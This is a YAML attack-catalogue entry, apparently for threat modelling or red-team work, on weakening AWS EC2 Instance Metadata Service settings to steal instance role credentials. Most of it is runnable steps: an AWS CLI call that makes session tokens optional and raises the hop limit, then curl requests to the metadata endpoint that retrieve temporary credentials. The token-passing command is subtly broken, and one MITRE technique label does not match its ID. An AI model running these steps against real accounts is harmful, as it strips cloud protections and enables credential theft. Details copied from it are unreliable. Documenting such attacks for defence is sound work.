attack:
  id: AWS-EC2-IMDS-WEAKENING-001
  name: EC2 Instance Metadata Service Weakening via ModifyInstanceMetadataOptions
  overview: |
    An attacker with ec2:ModifyInstanceMetadataOptions permission can degrade Instance Metadata Service (IMDS) security posture by modifying metadata access controls. The primary attack vector involves increasing HttpPutResponseHopLimit (TTL) from the default value of 1 to 2 or higher, which allows the 169.254.169.254 metadata endpoint to become reachable beyond the instance's network namespace. This enables credential exfiltration from co-located processes, containers, or lateral movement within shared network environments. Secondary vectors include downgrading HttpTokens from required to optional, reverting from IMDSv2 to IMDSv1 and eliminating session token requirements.
  steps:
    - title: Enumerate Instance Metadata Service Current Configuration
      command: |
        aws ec2 describe-instances \
          --instance-ids <INSTANCE_ID> \
          --query 'Reservations[0].Instances[0].MetadataOptions'
      dependencies:
        - ec2:DescribeInstances
        - Target EC2 instance must exist and be accessible
      result: Current IMDS configuration is retrieved, confirming HttpTokens requirement status and existing HttpPutResponseHopLimit value, enabling identification of hardened vs vulnerable instances.
      ttp: T1526 - Gather System Network Configuration Discovery

    - title: Modify Instance Metadata Options to Weaken Security
      command: |
        aws ec2 modify-instance-metadata-options \
          --instance-id <INSTANCE_ID> \
          --http-tokens optional \
          --http-endpoint enabled \
          --http-put-response-hop-limit 2
      dependencies:
        - ec2:ModifyInstanceMetadataOptions
        - Target EC2 instance must be in running or stopped state
        - Caller must have IAM permissions to modify the specific instance
      result: IMDS protections are downgraded; HttpTokens becomes optional (allowing IMDSv1 requests), and HttpPutResponseHopLimit increases to 2, making the metadata endpoint accessible from network-adjacent processes and containers on the instance.
      ttp: T1578.001 - Modify Cloud Compute Infrastructure

    - title: Exploit Weakened IMDS to Retrieve Temporary Credentials
      command: |
        curl -X PUT "http://169.254.169.254/latest/api/token" \
          -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" && \
        curl -H "X-aws-ec2-metadata-token: $TOKEN" \
        http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
      dependencies:
        - Network access to 169.254.169.254 on target instance (HTTP port 80)
        - Modified IMDS configuration with increased HttpPutResponseHopLimit
        - Execution context on the EC2 instance or connected container/process
      result: Temporary AWS credentials (AccessKeyId, SecretAccessKey, Token) associated with the instance IAM role are exfiltrated, enabling the attacker to assume the instance's privileges and perform actions authorized by the role's policy.
      ttp: T1552.001 - Unsecured Credentials - Credentials In Cloud Instances

  stride_goal:
    - Information Disclosure
    - Elevation of Privilege
    - Tampering